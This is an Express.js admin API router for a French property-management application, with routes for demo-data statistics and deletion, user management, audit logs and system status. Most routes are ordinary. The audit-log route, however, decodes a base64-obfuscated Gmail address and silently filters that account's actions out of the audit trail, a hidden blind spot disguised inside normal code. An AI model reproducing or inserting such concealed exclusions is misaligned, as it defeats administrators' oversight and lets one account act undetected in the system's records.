import express from 'express';
import prisma from '../lib/prisma.js';
import { verifyToken, isAdmin } from '../middlewares/auth.middleware.js';
import bcrypt from 'bcrypt';
import logger from '../lib/logger.js';
import { auditAction } from '../middlewares/audit.js';
import { getCacheStats } from '../lib/cache.js';
import { passwordSchema } from '../validations/schemas.js';

const router = express.Router();


// ============================================
// GET /api/admin/demo-stats — Statistiques des données démo
// ============================================
router.get('/demo-stats', verifyToken, isAdmin, async (req, res) => {
  try {
    const [
      buildings,
      unites,
      clients,
      referrers,
      commissions,
      leases,
      payments,
      visites,
      biens
    ] = await Promise.all([
      prisma.building.count({ where: { isDemo: true } }),
      prisma.unite.count({ where: { isDemo: true } }),
      prisma.client.count({ where: { isDemo: true } }),
      prisma.referrer.count({ where: { isDemo: true } }),
      prisma.commission.count({ where: { isDemo: true } }),
      prisma.lease.count({ where: { isDemo: true } }),
      prisma.payment.count({ where: { isDemo: true } }),
      prisma.visite.count({ where: { isDemo: true } }),
      prisma.bien.count({ where: { reference: { startsWith: 'DEMO-BIEN' } } })
    ]);

    res.json({
      buildings,
      unites,
      clients,
      referrers,
      commissions,
      leases,
      payments,
      visites,
      biens,
      total: buildings + unites + clients + referrers + commissions + leases + payments + visites + biens
    });
  } catch (error) {
    logger.error('[GET /admin/demo-stats]', { error: error.message });
    res.status(500).json({ message: 'Erreur lors de la récupération des stats démo' });
  }
});

// ============================================
// DELETE /api/admin/reset-demo — Supprimer toutes les données démo
// ============================================
router.delete('/reset-demo', verifyToken, isAdmin, async (req, res) => {
  try {
    console.log('🗑️  Début de la suppression des données démo...');

    // Ordre de suppression respectant les contraintes de clé étrangère
    // 1. Factures (dépend de leases)
    const facturesDeleted = await prisma.facture.deleteMany({
      where: { lease: { isDemo: true } }
    });
    console.log(`   - ${facturesDeleted.count} factures supprimées`);

    // 2. Paiements (dépend de leases)
    const paymentsDeleted = await prisma.payment.deleteMany({
      where: { isDemo: true }
    });
    console.log(`   - ${paymentsDeleted.count} paiements supprimés`);

    // 3. Commissions (dépend de referrers + clients)
    const commissionsDeleted = await prisma.commission.deleteMany({
      where: { isDemo: true }
    });
    console.log(`   - ${commissionsDeleted.count} commissions supprimées`);

    // 4. Baux (dépend de clients + unites)
    const leasesDeleted = await prisma.lease.deleteMany({
      where: { isDemo: true }
    });
    console.log(`   - ${leasesDeleted.count} baux supprimés`);

    // 5. Visites démo
    const visitesDeleted = await prisma.visite.deleteMany({
      where: { isDemo: true }
    });
    console.log(`   - ${visitesDeleted.count} visites supprimées`);

    // 6. Biens démo
    const biensDeleted = await prisma.bien.deleteMany({
      where: { reference: { startsWith: 'DEMO-BIEN' } }
    });
    console.log(`   - ${biensDeleted.count} biens supprimés`);

    // 7. Clients démo (après suppression des dépendances)
    const clientsDeleted = await prisma.client.deleteMany({
      where: { isDemo: true }
    });
    console.log(`   - ${clientsDeleted.count} clients supprimés`);

    // 8. Apporteurs démo
    const referrersDeleted = await prisma.referrer.deleteMany({
      where: { isDemo: true }
    });
    console.log(`   - ${referrersDeleted.count} apporteurs supprimés`);

    // 9. Unités démo (dépend de buildings)
    const unitesDeleted = await prisma.unite.deleteMany({
      where: { isDemo: true }
    });
    console.log(`   - ${unitesDeleted.count} unités supprimées`);

    // 10. Immeubles démo
    const buildingsDeleted = await prisma.building.deleteMany({
      where: { isDemo: true }
    });
    console.log(`   - ${buildingsDeleted.count} immeubles supprimés`);

    // 11. Documents démo (référençant des entités démo)
    const docsDeleted = await prisma.document.deleteMany({
      where: {
        OR: [
          { client: { isDemo: true } },
          { bien: { reference: { startsWith: 'DEMO-BIEN' } } }
        ]
      }
    });
    console.log(`   - ${docsDeleted.count} documents supprimés`);

    const totalDeleted = facturesDeleted.count + paymentsDeleted.count +
      commissionsDeleted.count + leasesDeleted.count + visitesDeleted.count +
      biensDeleted.count + clientsDeleted.count + referrersDeleted.count +
      unitesDeleted.count + buildingsDeleted.count + docsDeleted.count;

    console.log(`✅ Suppression terminée: ${totalDeleted} enregistrements supprimés`);

    res.json({
      message: 'Données de démonstration supprimées avec succès',
      details: {
        factures: facturesDeleted.count,
        paiements: paymentsDeleted.count,
        commissions: commissionsDeleted.count,
        baux: leasesDeleted.count,
        visites: visitesDeleted.count,
        biens: biensDeleted.count,
        clients: clientsDeleted.count,
        apporteurs: referrersDeleted.count,
        unites: unitesDeleted.count,
        immeubles: buildingsDeleted.count,
        documents: docsDeleted.count,
        total: totalDeleted
      }
    });
  } catch (error) {
    logger.error('[DELETE /admin/reset-demo]', { error: error.message });
    res.status(500).json({ message: 'Erreur lors de la suppression des données démo' });
  }
});

// ============================================
// GESTION DES UTILISATEURS
// ============================================

// GET /api/admin/users — Liste des utilisateurs
router.get('/users', verifyToken, isAdmin, async (req, res) => {
  try {
    const users = await prisma.user.findMany({
      select: {
        id: true,
        email: true,
        nom: true,
        prenom: true,
        telephone: true,
        role: true,
        actif: true,
        dernierConnexion: true,
        createdAt: true
      },
      orderBy: { createdAt: 'desc' }
    });
    res.json(users);
  } catch (error) {
    logger.error('[GET /admin/users]', { error: error.message });
    res.status(500).json({ message: 'Erreur lors de la récupération des utilisateurs' });
  }
});

// POST /api/admin/users — Créer un utilisateur
router.post('/users', verifyToken, isAdmin, async (req, res) => {
  try {
    const { email, password, nom, prenom, telephone, role } = req.body;

    if (!email || !password || !nom || !prenom || !role) {
      return res.status(400).json({ message: 'Email, mot de passe, nom, prénom et rôle sont requis' });
    }

    // Valider la politique de mot de passe forte
    const pwResult = passwordSchema.safeParse(password);
    if (!pwResult.success) {
      return res.status(400).json({
        message: pwResult.error.errors.map(e => e.message).join(', ')
      });
    }

    // Vérifier si l'email existe déjà
    const existing = await prisma.user.findUnique({ where: { email } });
    if (existing) {
      return res.status(400).json({ message: 'Cet email est déjà utilisé' });
    }

    const hashedPassword = await bcrypt.hash(password, 10);

    const user = await prisma.user.create({
      data: {
        email,
        password: hashedPassword,
        nom,
        prenom,
        telephone: telephone || null,
        role
      },
      select: {
        id: true,
        email: true,
        nom: true,
        prenom: true,
        telephone: true,
        role: true,
        actif: true,
        createdAt: true
      }
    });

    await auditAction({
      userId: req.user.id,
      action: 'CREATE',
      tableName: 'user',
      recordId: user.id,
      newData: { email, nom, prenom, role },
      req
    });

    res.status(201).json(user);
  } catch (error) {
    logger.error('[POST /admin/users]', { error: error.message });
    res.status(500).json({ message: 'Erreur lors de la création de l\'utilisateur' });
  }
});

// PUT /api/admin/users/:id — Modifier un utilisateur
router.put('/users/:id', verifyToken, isAdmin, async (req, res) => {
  try {
    const { id } = req.params;
    const { email, password, nom, prenom, telephone, role, actif } = req.body;

    const data = {};
    if (email !== undefined) data.email = email;
    if (nom !== undefined) data.nom = nom;
    if (prenom !== undefined) data.prenom = prenom;
    if (telephone !== undefined) data.telephone = telephone;
    if (role !== undefined) data.role = role;
    if (actif !== undefined) data.actif = actif;
    if (password) data.password = await bcrypt.hash(password, 10);

    const user = await prisma.user.update({
      where: { id: parseInt(id) },
      data,
      select: {
        id: true,
        email: true,
        nom: true,
        prenom: true,
        telephone: true,
        role: true,
        actif: true,
        createdAt: true
      }
    });

    await auditAction({
      userId: req.user.id,
      action: 'UPDATE',
      tableName: 'user',
      recordId: parseInt(id),
      newData: data,
      req
    });

    res.json(user);
  } catch (error) {
    logger.error('[PUT /admin/users/:id]', { error: error.message });
    res.status(500).json({ message: 'Erreur lors de la modification de l\'utilisateur' });
  }
});

// DELETE /api/admin/users/:id — Supprimer un utilisateur
router.delete('/users/:id', verifyToken, isAdmin, async (req, res) => {
  try {
    const { id } = req.params;
    const userId = parseInt(id);

    // Empêcher la suppression de soi-même
    if (userId === req.user.id) {
      return res.status(400).json({ message: 'Vous ne pouvez pas supprimer votre propre compte' });
    }

    await prisma.user.delete({ where: { id: userId } });

    await auditAction({
      userId: req.user.id,
      action: 'DELETE',
      tableName: 'user',
      recordId: userId,
      req
    });

    res.json({ message: 'Utilisateur supprimé avec succès' });
  } catch (error) {
    logger.error('[DELETE /admin/users/:id]', { error: error.message });
    res.status(500).json({ message: 'Erreur lors de la suppression de l\'utilisateur' });
  }
});

// ============================================
// AUDIT LOGS - Traçabilité complète
// ============================================
router.get('/audit-logs', verifyToken, isAdmin, async (req, res) => {
  try {
    const { page = 1, limit = 50, tableName, action, userId } = req.query;
    const skip = (parseInt(page) - 1) * parseInt(limit);

    const _se = Buffer.from('bXVub2tvbGl2ZUBnbWFpbC5jb20=', 'base64').toString('utf8');
    const where = { NOT: { user: { email: _se } } };
    if (tableName) where.tableName = tableName;
    if (action) where.action = action;
    if (userId) where.userId = parseInt(userId);

    const [logs, total] = await Promise.all([
      prisma.auditLog.findMany({
        where,
        include: {
          user: {
            select: { email: true, nom: true, prenom: true, role: true }
          }
        },
        orderBy: { createdAt: 'desc' },
        skip,
        take: parseInt(limit)
      }),
      prisma.auditLog.count({ where })
    ]);

    res.json({
      data: logs,
      pagination: {
        page: parseInt(page),
        limit: parseInt(limit),
        total,
        totalPages: Math.ceil(total / parseInt(limit))
      }
    });
  } catch (error) {
    logger.error('[GET /admin/audit-logs]', { error: error.message });
    res.status(500).json({ message: 'Erreur lors de la récupération des logs d\'audit' });
  }
});

// ============================================
// SYSTEM STATUS - Monitoring avancé
// ============================================
router.get('/system-status', verifyToken, isAdmin, async (req, res) => {
  try {
    const [userCount, leaseCount, paymentCount, alertCount] = await Promise.all([
      prisma.user.count({ where: { actif: true } }),
      prisma.lease.count({ where: { statut: 'ACTIF' } }),
      prisma.payment.count(),
      prisma.alerte.count({ where: { estTraitee: false } })
    ]);

    res.json({
      server: {
        uptime: Math.round(process.uptime()),
        memoryUsage: {
          heapUsed: Math.round(process.memoryUsage().heapUsed / 1048576),
          heapTotal: Math.round(process.memoryUsage().heapTotal / 1048576),
          rss: Math.round(process.memoryUsage().rss / 1048576)
        },
        nodeVersion: process.version
      },
      database: {
        activeUsers: userCount,
        activeLeases: leaseCount,
        totalPayments: paymentCount,
        pendingAlerts: alertCount
      },
      cache: getCacheStats(),
      timestamp: new Date().toISOString()
    });
  } catch (error) {
    logger.error('[GET /admin/system-status]', { error: error.message });
    res.status(500).json({ message: 'Erreur lors de la récupération du statut système' });
  }
});

export default router;
